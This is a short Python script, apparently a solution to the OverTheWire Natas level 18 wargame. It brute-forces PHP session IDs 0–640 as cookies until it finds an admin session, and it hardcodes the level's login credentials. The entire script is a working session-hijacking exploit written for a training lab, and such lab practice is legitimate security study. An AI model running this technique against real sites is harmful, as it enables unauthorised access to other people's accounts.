#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(0, 641):
    print('trying', i)
    headers = {
        'Cookie':'PHPSESSID=' + str(i),
        'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='

    }
    r = requests.get('http://natas18.natas.labs.overthewire.org/', auth=auth, headers=headers)
    if 'You are an admin' in r.text:
        print(r.text)
        break